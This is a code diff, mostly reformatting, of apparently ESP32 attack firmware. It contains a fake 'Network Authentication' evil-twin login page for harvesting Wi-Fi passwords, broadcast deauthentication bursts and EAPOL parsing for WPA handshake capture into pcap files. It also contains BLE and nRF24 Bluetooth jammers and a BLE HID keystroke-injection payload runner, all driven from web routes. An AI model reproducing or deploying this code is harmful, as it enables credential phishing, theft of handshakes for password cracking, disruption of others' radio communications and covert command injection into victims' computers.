 <title>Network Authentication</title>
@@ -1035,11 +1065,13 @@ body{background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify
 .btn{width:100%;padding:14px;background:#0066cc;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:20px}
 .btn:hover{background:#0052a3}
 .ft{text-align:center;padding:18px;background:#f5f5f5;font-size:12px;color:#666}
-)rawliteral" + loaderCSS + R"rawliteral(
+)rawliteral" +
+           loaderCSS + R"rawliteral(
 </style></head><body>
-<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
+<div class="box">)rawliteral" +
+           loaderHTML + R"rawliteral(
 <div class="hd"><h1>Network Authentication</h1><p>Secure connection required</p><div class="badge">SSID: )rawliteral" +
-         ssid + R"rawliteral(</div></div>
+           ssid + R"rawliteral(</div></div>
 <div class="ct">
 <div class="notice"><strong>Security Notice:</strong> Authentication required for internet access.</div>
 <form id="lf" onsubmit="doLogin(event)">
@@ -1049,15 +1081,18 @@ body{background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify
 <button type="submit" class="btn">Sign In</button>
 </form></div>
 <div class="ft"><p>&copy; 2026 Network Services. All rights reserved.</p></div>
-</div>)rawliteral" + submitJS + "</body></html>";
+</div>)rawliteral" +
+           submitJS + "</body></html>";
   }
 }
 
 /* ============ EAPOL / HANDSHAKE ============ */
 // Calculate 802.11 data frame header length (handles QoS, 4-addr, HT Control)
 int getDataHeaderLen(const uint8_t *payload, uint32_t len) {
-  if (len < 24) return 24;
-  int hdrLen = 24; // base: FC(2) + Dur(2) + Addr1(6) + Addr2(6) + Addr3(6) + SeqCtl(2)
+  if (len < 24)
+    return 24;
+  int hdrLen =
+      24; // base: FC(2) + Dur(2) + Addr1(6) + Addr2(6) + Addr3(6) + SeqCtl(2)
 
   // 4-address frame (To DS=1 AND From DS=1) — adds Addr4 (6 bytes)
   if ((payload[1] & 0x03) == 0x03) {
@@ -1070,7 +1105,8 @@ int getDataHeaderLen(const uint8_t *payload, uint32_t len) {
     hdrLen += 2;
   }
 
-  // HT Control field present when Order bit (byte 1, bit 7) is set — adds 4 bytes
+  // HT Control field present when Order bit (byte 1, bit 7) is set — adds 4
+  // bytes
   if (payload[1] & 0x80) {
     hdrLen += 4;
   }
@@ -1079,15 +1115,17 @@ int getDataHeaderLen(const uint8_t *payload, uint32_t len) {
 }
 
 bool isEAPOLFrame(const uint8_t *payload, uint32_t len) {
-  if (len < 34) return false;
+  if (len < 34)
+    return false;
   int hdrLen = getDataHeaderLen(payload, len);
   // Need at least header + 8 bytes LLC/SNAP
-  if ((int)len < hdrLen + 8) return false;
+  if ((int)len < hdrLen + 8)
+    return false;
 
   // Primary check: LLC/SNAP header at calculated offset for 802.1X (0x888E)
   if (payload[hdrLen] == 0xAA && payload[hdrLen + 1] == 0xAA &&
-      payload[hdrLen + 2] == 0x03 &&
-      payload[hdrLen + 6] == 0x88 && payload[hdrLen + 7] == 0x8E)
+      payload[hdrLen + 2] == 0x03 && payload[hdrLen + 6] == 0x88 &&
+      payload[hdrLen + 7] == 0x8E)
     return true;
 
   // Fallback: scan common offsets (24, 26, 28, 30, 32) for 0x888E EtherType
@@ -1095,11 +1133,13 @@ bool isEAPOLFrame(const uint8_t *payload, uint32_t len) {
   static const int fallbackOffsets[] = {24, 26, 28, 30, 32};
   for (int f = 0; f < 5; f++) {
     int off = fallbackOffsets[f];
-    if (off == hdrLen) continue; // already checked
-    if (off + 8 > (int)len) continue;
+    if (off == hdrLen)
+      continue; // already checked
+    if (off + 8 > (int)len)
+      continue;
     if (payload[off] == 0xAA && payload[off + 1] == 0xAA &&
-        payload[off + 2] == 0x03 &&
-        payload[off + 6] == 0x88 && payload[off + 7] == 0x8E)
+        payload[off + 2] == 0x03 && payload[off + 6] == 0x88 &&
+        payload[off + 7] == 0x8E)
       return true;
   }
   return false;
@@ -1108,19 +1148,19 @@ bool isEAPOLFrame(const uint8_t *payload, uint32_t len) {
 // Find the LLC/SNAP 0x888E offset (used by getEAPOLMessageType)
 int findEAPOLOffset(const uint8_t *payload, uint32_t len) {
   int hdrLen = getDataHeaderLen(payload, len);
-  if (hdrLen + 8 <= (int)len &&
-      payload[hdrLen] == 0xAA && payload[hdrLen + 1] == 0xAA &&
-      payload[hdrLen + 2] == 0x03 &&
+  if (hdrLen + 8 <= (int)len && payload[hdrLen] == 0xAA &&
+      payload[hdrLen + 1] == 0xAA && payload[hdrLen + 2] == 0x03 &&
       payload[hdrLen + 6] == 0x88 && payload[hdrLen + 7] == 0x8E)
     return hdrLen;
   // Fallback scan
   static const int fallbackOffsets[] = {24, 26, 28, 30, 32};
   for (int f = 0; f < 5; f++) {
     int off = fallbackOffsets[f];
-    if (off + 8 > (int)len) continue;
+    if (off + 8 > (int)len)
+      continue;
     if (payload[off] == 0xAA && payload[off + 1] == 0xAA &&
-        payload[off + 2] == 0x03 &&
-        payload[off + 6] == 0x88 && payload[off + 7] == 0x8E)
+        payload[off + 2] == 0x03 && payload[off + 6] == 0x88 &&
+        payload[off + 7] == 0x8E)
       return off;
   }
   return -1;
@@ -1128,20 +1168,23 @@ int findEAPOLOffset(const uint8_t *payload, uint32_t len) {
 
 uint8_t getEAPOLMessageType(const uint8_t *payload, uint32_t len) {
   int llcOff = findEAPOLOffset(payload, len);
-  if (llcOff < 0) return 0;
+  if (llcOff < 0)
+    return 0;
 
-  // LLC/SNAP(8) + EAPOL hdr: version(1) + type(1) + length(2) + descriptor_type(1) = 5
+  // LLC/SNAP(8) + EAPOL hdr: version(1) + type(1) + length(2) +
+  // descriptor_type(1) = 5
   int keyInfoOff = llcOff + 8 + 5; // offset of key_info field
   // key_info(2) + key_length(2) + replay_counter(8) = 12 bytes to nonce
   int nonceOff = keyInfoOff + 2 + 2 + 8;
 
-  if ((int)len < nonceOff + 32) return 0;
+  if ((int)len < nonceOff + 32)
+    return 0;
 
   uint16_t keyInfo = (payload[keyInfoOff] << 8) | payload[keyInfoOff + 1];
   bool pairwise = (keyInfo & 0x0008) != 0;
-  bool install  = (keyInfo & 0x0040) != 0;
-  bool ack      = (keyInfo & 0x0080) != 0;
-  bool mic      = (keyInfo & 0x0100) != 0;
+  bool install = (keyInfo & 0x0040) != 0;
+  bool ack = (keyInfo & 0x0080) != 0;
+  bool mic = (keyInfo & 0x0100) != 0;
 
   if (pairwise) {
     if (ack && !mic && !install)
@@ -1152,7 +1195,10 @@ uint8_t getEAPOLMessageType(const uint8_t *payload, uint32_t len) {
       // Could be M2 or M4. M4 has zero nonce.
       bool nonceZero = true;
       for (int i = nonceOff; i < nonceOff + 32 && i < (int)len; i++) {
-        if (payload[i] != 0) { nonceZero = false; break; }
+        if (payload[i] != 0) {
+          nonceZero = false;
+          break;
+        }
       }
       if (nonceZero)
         return 4; // M4: STA -> AP (MIC, zero nonce)
@@ -1375,7 +1421,8 @@ void sendDeauthBurst() {
 
   // === Broadcast deauth from AP (multiple reasons) ===
   for (int r = 0; r < nReasons; r++) {
-    buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xC0, reasons[r]);
+    buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xC0,
+                     reasons[r]);
     sendRawFrame(pkt, 26);
     deauthPktsSent++;
   }
@@ -1429,31 +1476,33 @@ static esp_ble_adv_params_t btJamAdvParams;
 static esp_ble_scan_params_t btJamScanParams;
 
 // GAP event callback — required for BLE stack to function
-static void btJamGapCallback(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
+static void btJamGapCallback(esp_gap_ble_cb_event_t event,
+                             esp_ble_gap_cb_param_t *param) {
   switch (event) {
-    case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
-      // Raw advertising data set, start advertising
-      esp_ble_gap_start_advertising(&btJamAdvParams);
-      break;
-    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
-      btAdvActive = true;
-      break;
-    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
-      btAdvActive = false;
-      break;
-    case ESP_GAP_BLE_SCAN_START_COMPLETE_EVT:
-      btScanActive = true;
-      break;
-    case ESP_GAP_BLE_SCAN_STOP_COMPLETE_EVT:
-      btScanActive = false;
-      break;
-    default:
-      break;
+  case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
+    // Raw advertising data set, start advertising
+    esp_ble_gap_start_advertising(&btJamAdvParams);
+    break;
+  case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
+    btAdvActive = true;
+    break;
+  case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
+    btAdvActive = false;
+    break;
+  case ESP_GAP_BLE_SCAN_START_COMPLETE_EVT:
+    btScanActive = true;
+    break;
+  case ESP_GAP_BLE_SCAN_STOP_COMPLETE_EVT:
+    btScanActive = false;
+    break;
+  default:
+    break;
   }
 }
 
 void btJamInit() {
-  if (btInitialized) return;
+  if (btInitialized)
+    return;
   esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
   bt_cfg.mode = ESP_BT_MODE_BLE;
   if (esp_bt_controller_init(&bt_cfg) != ESP_OK) {
@@ -1498,7 +1547,8 @@ void btJamInit() {
 
   // Pre-configure scan params (aggressive active scanning for more RF noise)
   memset(&btJamScanParams, 0, sizeof(btJamScanParams));
-  btJamScanParams.scan_type = BLE_SCAN_TYPE_ACTIVE; // Active scan = sends SCAN_REQ
+  btJamScanParams.scan_type =
+      BLE_SCAN_TYPE_ACTIVE; // Active scan = sends SCAN_REQ
   btJamScanParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
   btJamScanParams.scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL;
   btJamScanParams.scan_interval = 0x0010; // 10ms — very aggressive
@@ -1512,7 +1562,8 @@ void btJamInit() {
 }
 
 void btJamDeinit() {
-  if (!btInitialized) return;
+  if (!btInitialized)
+    return;
   esp_ble_gap_stop_scanning();
   esp_ble_gap_stop_advertising();
   delay(100); // Give BLE stack time to stop cleanly
@@ -1527,14 +1578,16 @@ void btJamDeinit() {
 }
 
 void sendBtJamBurst() {
-  if (!btInitialized) return;
+  if (!btInitialized)
+    return;
 
   // --- BLE Advertising flood ---
   // Each burst: randomize address + data, push raw adv, let it transmit
   for (int burst = 0; burst < 3; burst++) {
     // Randomize BLE source address each burst
     esp_bd_addr_t randAddr;
-    for (int i = 0; i < 6; i++) randAddr[i] = (uint8_t)esp_random();
+    for (int i = 0; i < 6; i++)
+      randAddr[i] = (uint8_t)esp_random();
     randAddr[0] |= 0xC0; // Static random address
     esp_ble_gap_stop_advertising();
     delay(2);
@@ -1543,7 +1596,8 @@ void sendBtJamBurst() {
 
     // Build raw advertising payload with random noise
     uint8_t rawAdv[31];
-    for (int i = 0; i < 31; i++) rawAdv[i] = (uint8_t)esp_random();
+    for (int i = 0; i < 31; i++)
+      rawAdv[i] = (uint8_t)esp_random();
     // Valid flags header so the packet isn't dropped by the controller
     rawAdv[0] = 0x02; // Length
     rawAdv[1] = 0x01; // Type: Flags
@@ -1552,7 +1606,8 @@ void sendBtJamBurst() {
     // Use RAW data inject — faster, bypasses struct validation
     esp_ble_gap_config_adv_data_raw(rawAdv, 31);
     // The GAP callback will auto-start advertising when data is set
-    delay(25); // Let at least one full advertising event transmit on all 3 channels
+    delay(25); // Let at least one full advertising event transmit on all 3
+               // channels
 
     btJamPktsSent++;
   }
@@ -1561,7 +1616,8 @@ void sendBtJamBurst() {
   // Active scanning sends SCAN_REQ packets = more RF interference on 2.4GHz
   if (!btScanActive) {
     esp_bd_addr_t scanAddr;
-    for (int i = 0; i < 6; i++) scanAddr[i] = (uint8_t)esp_random();
+    for (int i = 0; i < 6; i++)
+      scanAddr[i] = (uint8_t)esp_random();
     scanAddr[0] |= 0xC0;
     esp_ble_gap_set_scan_params(&btJamScanParams);
     esp_ble_gap_start_scanning(1); // Scan for 1 second
@@ -1570,15 +1626,15 @@ void sendBtJamBurst() {
 }
 
 /* ============ NRF24 CLASSIC BT JAMMER ============ */
-#define NRF_CE  4
+#define NRF_CE 4
 #define NRF_CSN 5
 RF24 nrfRadio(NRF_CE, NRF_CSN);
 
 // Classic BT uses 2402-2480 MHz = nRF24 channels 2-80
-static const uint8_t BT_CHANNELS[] = {
-  2, 4, 6, 8,10,12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,
-  42,44,46,48,50,52,54,56,58,60,62,64,66,68,70,72,74,76,78,80
-};
+static const uint8_t BT_CHANNELS[] = {2,  4,  6,  8,  10, 12, 14, 16, 18, 20,
+                                      22, 24, 26, 28, 30, 32, 34, 36, 38, 40,
+                                      42, 44, 46, 48, 50, 52, 54, 56, 58, 60,
+                                      62, 64, 66, 68, 70, 72, 74, 76, 78, 80};
 static const int BT_CH_COUNT = sizeof(BT_CHANNELS);
 static uint8_t nrfNoisePayload[32];
 
@@ -1596,8 +1652,9 @@ bool nrfJamInit() {
   nrfRadio.setCRCLength(RF24_CRC_DISABLED);
   nrfRadio.setRetries(0, 0);
   nrfRadio.setPayloadSize(32);
-  for (int i = 0; i < 32; i++) nrfNoisePayload[i] = (uint8_t)random(256);
-  uint8_t addr[6] = {'J','A','M','N','R','F'};
+  for (int i = 0; i < 32; i++)
+    nrfNoisePayload[i] = (uint8_t)random(256);
+  uint8_t addr[6] = {'J', 'A', 'M', 'N', 'R', 'F'};
   nrfRadio.openWritingPipe(addr);
   nrfRadio.stopListening();
   nrfReady = true;
@@ -1607,11 +1664,13 @@ bool nrfJamInit() {
 }
 
 void sendNrfJamBurst() {
-  if (!nrfReady) return;
+  if (!nrfReady)
+    return;
   for (int i = 0; i < BT_CH_COUNT; i++) {
     nrfRadio.setChannel(BT_CHANNELS[i]);
     // Randomize payload each channel for wider spectral interference
-    for (int j = 0; j < 32; j++) nrfNoisePayload[j] = (uint8_t)esp_random();
+    for (int j = 0; j < 32; j++)
+      nrfNoisePayload[j] = (uint8_t)esp_random();
     nrfRadio.writeFast(nrfNoisePayload, 32, true);
     nrfJamPktsSent++;
   }
@@ -1880,7 +1939,8 @@ void enablePromiscuous() {
     esp_wifi_set_promiscuous_filter(&filter);
     delay(100);
   }
-  Serial.printf("[!] Channel set failed after retries — continuing on current channel\n");
+  Serial.printf(
+      "[!] Channel set failed after retries — continuing on current channel\n");
 }
 
 String getPhaseString() {
@@ -1907,53 +1967,95 @@ uint8_t resolveKeyConstant(String arg) {
     return (uint8_t)arg.charAt(1);
   }
   // Modifier keys
-  if (arg == "KEY_LEFT_GUI")   return KEY_LEFT_GUI;
-  if (arg == "KEY_LEFT_CTRL")  return KEY_LEFT_CTRL;
-  if (arg == "KEY_LEFT_SHIFT") return KEY_LEFT_SHIFT;
-  if (arg == "KEY_LEFT_ALT")   return KEY_LEFT_ALT;
-  if (arg == "KEY_RIGHT_GUI")  return KEY_LEFT_GUI;  // map to left
-  if (arg == "KEY_RIGHT_CTRL") return KEY_LEFT_CTRL;
-  if (arg == "KEY_RIGHT_SHIFT") return KEY_LEFT_SHIFT;
-  if (arg == "KEY_RIGHT_ALT")  return KEY_LEFT_ALT;
+  if (arg == "KEY_LEFT_GUI")
+    return KEY_LEFT_GUI;
+  if (arg == "KEY_LEFT_CTRL")
+    return KEY_LEFT_CTRL;
+  if (arg == "KEY_LEFT_SHIFT")
+    return KEY_LEFT_SHIFT;
+  if (arg == "KEY_LEFT_ALT")
+    return KEY_LEFT_ALT;
+  if (arg == "KEY_RIGHT_GUI")
+    return KEY_LEFT_GUI; // map to left
+  if (arg == "KEY_RIGHT_CTRL")
+    return KEY_LEFT_CTRL;
+  if (arg == "KEY_RIGHT_SHIFT")
+    return KEY_LEFT_SHIFT;
+  if (arg == "KEY_RIGHT_ALT")
+    return KEY_LEFT_ALT;
   // Common keys
-  if (arg == "KEY_RETURN" || arg == "KEY_ENTER") return KEY_RETURN;
-  if (arg == "KEY_ESC" || arg == "KEY_ESCAPE")   return KEY_ESC;
-  if (arg == "KEY_BACKSPACE")  return KEY_BACKSPACE;
-  if (arg == "KEY_TAB")        return KEY_TAB;
-  if (arg == "KEY_SPACE")      return ' ';
-  if (arg == "KEY_DELETE")     return KEY_DELETE;
-  if (arg == "KEY_INSERT")     return KEY_INSERT;
-  if (arg == "KEY_HOME")       return KEY_HOME;
-  if (arg == "KEY_END")        return KEY_END;
-  if (arg == "KEY_PAGE_UP")    return KEY_PAGE_UP;
-  if (arg == "KEY_PAGE_DOWN")  return KEY_PAGE_DOWN;
-  if (arg == "KEY_CAPS_LOCK")  return KEY_CAPS_LOCK;
-  if (arg == "KEY_PRTSC")      return KEY_PRTSC;
-  if (arg == "KEY_SCROLL_LOCK") return 0x47;
-  if (arg == "KEY_PAUSE")      return 0x48;
-  if (arg == "KEY_MENU")       return 0x65;
+  if (arg == "KEY_RETURN" || arg == "KEY_ENTER")
+    return KEY_RETURN;
+  if (arg == "KEY_ESC" || arg == "KEY_ESCAPE")
+    return KEY_ESC;
+  if (arg == "KEY_BACKSPACE")
+    return KEY_BACKSPACE;
+  if (arg == "KEY_TAB")
+    return KEY_TAB;
+  if (arg == "KEY_SPACE")
+    return ' ';
+  if (arg == "KEY_DELETE")
+    return KEY_DELETE;
+  if (arg == "KEY_INSERT")
+    return KEY_INSERT;
+  if (arg == "KEY_HOME")
+    return KEY_HOME;
+  if (arg == "KEY_END")
+    return KEY_END;
+  if (arg == "KEY_PAGE_UP")
+    return KEY_PAGE_UP;
+  if (arg == "KEY_PAGE_DOWN")
+    return KEY_PAGE_DOWN;
+  if (arg == "KEY_CAPS_LOCK")
+    return KEY_CAPS_LOCK;
+  if (arg == "KEY_PRTSC")
+    return KEY_PRTSC;
+  if (arg == "KEY_SCROLL_LOCK")
+    return 0x47;
+  if (arg == "KEY_PAUSE")
+    return 0x48;
+  if (arg == "KEY_MENU")
+    return 0x65;
   // Arrow keys
-  if (arg == "KEY_UP_ARROW")    return KEY_UP_ARROW;
-  if (arg == "KEY_DOWN_ARROW")  return KEY_DOWN_ARROW;
-  if (arg == "KEY_LEFT_ARROW")  return KEY_LEFT_ARROW;
-  if (arg == "KEY_RIGHT_ARROW") return KEY_RIGHT_ARROW;
+  if (arg == "KEY_UP_ARROW")
+    return KEY_UP_ARROW;
+  if (arg == "KEY_DOWN_ARROW")
+    return KEY_DOWN_ARROW;
+  if (arg == "KEY_LEFT_ARROW")
+    return KEY_LEFT_ARROW;
+  if (arg == "KEY_RIGHT_ARROW")
+    return KEY_RIGHT_ARROW;
   // Function keys
-  if (arg == "KEY_F1")  return KEY_F1;
-  if (arg == "KEY_F2")  return KEY_F2;
-  if (arg == "KEY_F3")  return KEY_F3;
-  if (arg == "KEY_F4")  return KEY_F4;
-  if (arg == "KEY_F5")  return KEY_F5;
-  if (arg == "KEY_F6")  return KEY_F6;
-  if (arg == "KEY_F7")  return KEY_F7;
-  if (arg == "KEY_F8")  return KEY_F8;
-  if (arg == "KEY_F9")  return KEY_F9;
-  if (arg == "KEY_F10") return KEY_F10;
-  if (arg == "KEY_F11") return KEY_F11;
-  if (arg == "KEY_F12") return KEY_F12;
+  if (arg == "KEY_F1")
+    return KEY_F1;
+  if (arg == "KEY_F2")
+    return KEY_F2;
+  if (arg == "KEY_F3")
+    return KEY_F3;
+  if (arg == "KEY_F4")
+    return KEY_F4;
+  if (arg == "KEY_F5")
+    return KEY_F5;
+  if (arg == "KEY_F6")
+    return KEY_F6;
+  if (arg == "KEY_F7")
+    return KEY_F7;
+  if (arg == "KEY_F8")
+    return KEY_F8;
+  if (arg == "KEY_F9")
+    return KEY_F9;
+  if (arg == "KEY_F10")
+    return KEY_F10;
+  if (arg == "KEY_F11")
+    return KEY_F11;
+  if (arg == "KEY_F12")
+    return KEY_F12;
   // Hex literal (0xNN)
-  if (arg.startsWith("0x") || arg.startsWith("0X")) return (uint8_t)strtol(arg.c_str(), NULL, 16);
+  if (arg.startsWith("0x") || arg.startsWith("0X"))
+    return (uint8_t)strtol(arg.c_str(), NULL, 16);
   // Numeric literal
-  if (arg.length() > 0 && isDigit(arg.charAt(0))) return (uint8_t)arg.toInt();
+  if (arg.length() > 0 && isDigit(arg.charAt(0)))
+    return (uint8_t)arg.toInt();
   return 0;
 }
 
@@ -1976,7 +2078,8 @@ String extractArg(String line, int prefixLen) {
 }
 
 String getNextPayloadLine() {
-  if (payloadOffset >= (int)payloadBuffer.length()) return "\x01"; // sentinel for end
+  if (payloadOffset >= (int)payloadBuffer.length())
+    return "\x01"; // sentinel for end
   int nextNL = payloadBuffer.indexOf('\n', payloadOffset);
   String line;
   if (nextNL < 0) {
@@ -2029,12 +2132,13 @@ void bleCleanRestart() {
   bleDisconnectTime = 0;
   bleReconnectCount = 0;
   bleReconnectWindowStart = millis();
-  Serial.println("[BLE] Clean restart complete — fresh BLE stack + advertising");
+  Serial.println(
+      "[BLE] Clean restart complete — fresh BLE stack + advertising");
 }
 
 // Type a string char-by-char — optimized for BLE speed without dropping chars
 // write() sends press+release in one call, 6ms gives BLE time to transmit
-void typeString(const char* str) {
+void typeString(const char *str) {
   while (*str) {
     bleKeyboard.write((uint8_t)*str);
     delay(6);
@@ -2044,19 +2148,25 @@ void typeString(const char* str) {
 
 // Execute one line of C++ Keyboard.h style payload
 void executeLine(String line) {
-  if (line.length() == 0) return;
+  if (line.length() == 0)
+    return;
   // Strip trailing semicolon
-  if (line.endsWith(";")) line = line.substring(0, line.length() - 1);
+  if (line.endsWith(";"))
+    line = line.substring(0, line.length() - 1);
   line.trim();
-  if (line.length() == 0) return;
+  if (line.length() == 0)
+    return;
   lastPayloadLine = line;
 
   // Comments
-  if (line.startsWith("//")) return;
+  if (line.startsWith("//"))
+    return;
   // Braces (ignored)
-  if (line == "{" || line == "}") return;
+  if (line == "{" || line == "}")
+    return;
   // void setup() / void loop() / #include — skip structural lines
-  if (line.startsWith("void ") || line.startsWith("#include")) return;
+  if (line.startsWith("void ") || line.startsWith("#include"))
+    return;
 
   // delay(ms)
   if (line.startsWith("delay(") && line.endsWith(")")) {
@@ -2147,7 +2257,10 @@ int countPayloadLines(String &buf) {
   int idx = 0;
   while (idx < (int)buf.length()) {
     int nl = buf.indexOf('\n', idx);
-    if (nl < 0) { count++; break; }
+    if (nl < 0) {
+      count++;
+      break;
+    }
     count++;
     idx = nl + 1;
   }
@@ -2482,7 +2595,8 @@ void setupRoutes() {
   server.on("/spamui", []() { server.send(200, "text/html", spamUI()); });
   server.on("/btjamui", []() { server.send(200, "text/html", btJamUI()); });
   server.on("/nrfjamui", []() { server.send(200, "text/html", nrfJamUI()); });
-  server.on("/payloadui", []() { server.send(200, "text/html", payloadInjectorUI()); });
+  server.on("/payloadui",
+            []() { server.send(200, "text/html", payloadInjectorUI()); });
 
   /* --- AJAX network scan (no page reload) --- */
   server.on("/scan", []() {
@@ -2590,7 +2704,8 @@ void setupRoutes() {
 
     // *** KEY FIX: Restart SoftAP on TARGET channel ***
     // This keeps the web UI accessible while we capture on the target channel.
-    // The user's device will briefly disconnect then auto-reconnect to same SSID.
+    // The user's device will briefly disconnect then auto-reconnect to same
+    // SSID.
     Serial.printf("[*] Restarting AP on target channel %d...\n", targetChannel);
     WiFi.softAPdisconnect(true);
     delay(200);
@@ -2769,8 +2884,9 @@ void setupRoutes() {
       server.send(500, "text/plain", "Failed to open file");
       return;
     }
-    captureDownloadCount++;
-    String filename = "capture_" + String(captureDownloadCount) + ".pcap";
+    String safeName = (targetSSID.length() > 0) ? targetSSID : "capture";
+    safeName.replace(" ", "_");
+    String filename = safeName + ".pcap";
     size_t fileSize = f.size();
     server.sendHeader("Content-Disposition",
                       "attachment; filename=" + filename);
@@ -2791,7 +2907,8 @@ void setupRoutes() {
     }
     evilTwinSSID = ssid;
     portalTemplate = server.arg("tpl").toInt();
-    if (portalTemplate < 0 || portalTemplate > 4) portalTemplate = 0;
+    if (portalTemplate < 0 || portalTemplate > 4)
+      portalTemplate = 0;
     credentialsCount = 0;
     WiFi.softAPdisconnect(true);
     delay(100);
@@ -2869,7 +2986,8 @@ void setupRoutes() {
   /* --- Bluetooth Jammer --- */
   server.on("/btjam", []() {
     if (bleKbStarted) {
-      server.send(400, "text/plain", "Stop Payload Injector first — both use BLE stack");
+      server.send(400, "text/plain",
+                  "Stop Payload Injector first — both use BLE stack");
       return;
     }
     // Must fully tear down NimBLE before Bluedroid can init
@@ -2880,8 +2998,10 @@ void setupRoutes() {
       Serial.println("[BT] NimBLE deinitialized for Bluedroid jammer");
     }
     int t = server.arg("time").toInt();
-    if (t < 5) t = 15;
-    if (t > 300) t = 300;
+    if (t < 5)
+      t = 15;
+    if (t > 300)
+      t = 300;
     btJamInit();
     if (!btInitialized) {
       server.send(500, "text/plain", "BT init failed");
@@ -2919,10 +3039,13 @@ void setupRoutes() {
   /* --- nRF24 Classic BT Jammer --- */
   server.on("/nrfjam", []() {
     int t = server.arg("time").toInt();
-    if (t < 5) t = 15;
-    if (t > 300) t = 300;
+    if (t < 5)
+      t = 15;
+    if (t > 300)
+      t = 300;
     if (!nrfJamInit()) {
-      server.send(500, "text/plain", "nRF24 not found — check wiring (CE→GPIO4 CSN→GPIO5)");
+      server.send(500, "text/plain",
+                  "nRF24 not found — check wiring (CE→GPIO4 CSN→GPIO5)");
       return;
     }
     nrfJamPktsSent = 0;
@@ -2936,7 +3059,8 @@ void setupRoutes() {
 
   server.on("/stopnrfjam", []() {
     nrfJamming = false;
-    if (nrfReady) nrfJamDeinit();
+    if (nrfReady)
+      nrfJamDeinit();
     Serial.printf("[NRF] Jammer stopped: %u pkts\n", nrfJamPktsSent);
     addEvent("nRF24 Jammer stopped: " + String(nrfJamPktsSent) + " pkts");
     server.send(200, "text/plain", "nRF24 jam stopped");
@@ -2953,18 +3077,22 @@ void setupRoutes() {
   /* --- Payload Injector (BLE HID Keyboard) --- */
   server.on("/payload/start", []() {
     if (bleKbStarted) {
-      server.send(200, "application/json", "{\"ok\":true,\"msg\":\"Already started\"}");
+      server.send(200, "application/json",
+                  "{\"ok\":true,\"msg\":\"Already started\"}");
       return;
     }
     // Read custom BLE device name from query parameter
     if (server.hasArg("name") && server.arg("name").length() > 0) {
       bleDeviceName = server.arg("name");
-      if (bleDeviceName.length() > 20) bleDeviceName = bleDeviceName.substring(0, 20);
+      if (bleDeviceName.length() > 20)
+        bleDeviceName = bleDeviceName.substring(0, 20);
     }
     bleKeyboard.setName(bleDeviceName.c_str());
     // Cannot run BLE keyboard while BT jammer is active
     if (btJamming) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Stop BT Jammer first — both use the BLE stack\"}");
+      server.send(200, "application/json",
+                  "{\"ok\":false,\"msg\":\"Stop BT Jammer first — both use the "
+                  "BLE stack\"}");
       return;
     }
 
@@ -2974,7 +3102,10 @@ void setupRoutes() {
       sniffing = false;
       deauthing = false;
       capturingHandshake = false;
-      if (pcapFile) { pcapFile.flush(); pcapFile.close(); }
+      if (pcapFile) {
+        pcapFile.flush();
+        pcapFile.close();
+      }
       delay(100);
       Serial.println("[PAYLOAD] Stopped WiFi monitor mode for BLE coexistence");
       addEvent("PAYLOAD: Stopped monitor mode for BLE");
@@ -2996,18 +3127,23 @@ void setupRoutes() {
       restartWiFiAP();
     }
 
-    // Initialize NimBLE — only on first call; reuse on 2nd+ to preserve bond keys
+    // Initialize NimBLE — only on first call; reuse on 2nd+ to preserve bond
+    // keys
     if (!bleNimbleReady) {
-      clearBLEBonds();  // Clear stale bonds before first init only
+      clearBLEBonds(); // Clear stale bonds before first init only
       delay(100);
       bleKeyboard.begin();
       bleNimbleReady = true;
       delay(500);
-      Serial.printf("[PAYLOAD] NimBLE initialized fresh — bonds cleared — advertising as '%s'\n", bleDeviceName.c_str());
+      Serial.printf("[PAYLOAD] NimBLE initialized fresh — bonds cleared — "
+                    "advertising as '%s'\n",
+                    bleDeviceName.c_str());
     } else {
-      // NimBLE already running with saved bond data — DO NOT restart or clear bonds
-      // Restarting clears ESP32 bonds but OS keeps old ones → key mismatch → reconnect loop
-      Serial.println("[PAYLOAD] NimBLE already running — reusing saved bond (no restart)");
+      // NimBLE already running with saved bond data — DO NOT restart or clear
+      // bonds Restarting clears ESP32 bonds but OS keeps old ones → key
+      // mismatch → reconnect loop
+      Serial.println(
+          "[PAYLOAD] NimBLE already running — reusing saved bond (no restart)");
       addEvent("PAYLOAD: Reusing existing BLE bond — no restart");
     }
 
@@ -3019,22 +3155,26 @@ void setupRoutes() {
     bleReconnectWindowStart = millis();
     payloadStatus = "idle";
 
-    Serial.printf("[PAYLOAD] BLE Keyboard activated (heap: %u)\n", ESP.getFreeHeap());
+    Serial.printf("[PAYLOAD] BLE Keyboard activated (heap: %u)\n",
+                  ESP.getFreeHeap());
     addEvent("PAYLOAD: BLE Keyboard started");
-    String startResp = "{\"ok\":true,\"msg\":\"BLE Keyboard started — look for '" + bleDeviceName + "' in Bluetooth settings\"}";
+    String startResp =
+        "{\"ok\":true,\"msg\":\"BLE Keyboard started — look for '" +
+        bleDeviceName + "' in Bluetooth settings\"}";
     server.send(200, "application/json", startResp);
   });
 
   server.on("/payload/disconnect", []() {
     if (!bleKbStarted) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"BLE Keyboard not started\"}");
+      server.send(200, "application/json",
+                  "{\"ok\":false,\"msg\":\"BLE Keyboard not started\"}");
       return;
     }
     Serial.println("[PAYLOAD] Disconnect requested — performing clean restart");
     addEvent("PAYLOAD: Disconnect — clean BLE restart");
     bleKeyboard.releaseAll();
     bleCleanRestart();
-    bleKbStarted = true;  // keep it started (re-advertising)
+    bleKbStarted = true; // keep it started (re-advertising)
     bleWasConnected = false;
     bleLastConnChange = millis();
     bleReconnectCount = 0;
